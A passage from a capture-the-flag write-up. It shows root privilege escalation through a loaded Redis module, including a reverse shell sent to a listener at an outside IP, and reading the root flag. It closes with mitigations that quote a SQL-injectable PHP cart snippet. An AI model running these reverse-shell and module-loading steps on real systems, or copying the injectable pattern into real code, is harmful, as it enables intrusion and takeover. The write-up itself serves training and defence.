-rw-r--r-- 1 dan_smith dan_smith   598 Jul  9  2019 README.md
-rw-r--r-- 1 dan_smith dan_smith 29043 Jul  9  2019 redismodule.h
drwxr-xr-x 2 dan_smith dan_smith  4096 Nov  6 17:16 rmutil
drwxr-xr-x 2 dan_smith dan_smith  4096 Nov  6 17:16 src
```

Then I connected to Redis, loaded the module, and used it to get a reverse shell as root.


```bash
dan_smith@shared:~/RedisModules-ExecuteCommand-master$ redis-cli

127.0.0.1:6379> auth REDACTED
OK

127.0.0.1:6379> module load /home/dan_smith/RedisModules-ExecuteCommand-master/module.so
OK

127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"

127.0.0.1:6379> system.rev 10.10.14.143 4444
```

My listener got the shell and I read the flag.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.143] from (UNKNOWN) [10.129.14.133] 49794

whoami
root

cat /root/root.txt
REDACTED
```

## Mitigation

The first thing to do to protect this box would be to fix the SQL Injection vulnerability. 

```php
$cart_content = [];
if(isset($_COOKIE["custom_cart"])) {
   $custom_cart = json_decode($_COOKIE["custom_cart"], true);
   $i=0;
   foreach($custom_cart as $code => $qty) {
      $sql = "SELECT id, code, price from product where code='".$code."'";

      // Prevent time-based sql injection
      if(strpos(strtolower($sql), "sleep") !== false || strpos(strtolower($sql), "benchmark") !== false)
            continue;
```

The code take the product code from the request and append it directly to the SQL query. It checks for time base injection by forbidding `sleep` and `benchmark`, but it allows simpler injection. It should have prepared statements instead.

Next, the server ran an outdated version of IPython that had a known vulnerability. The server should be kept up to date. 

And lastly, Redis should not have been running as root. This kind of server should always run as a dedicated user that only has access to the needed files.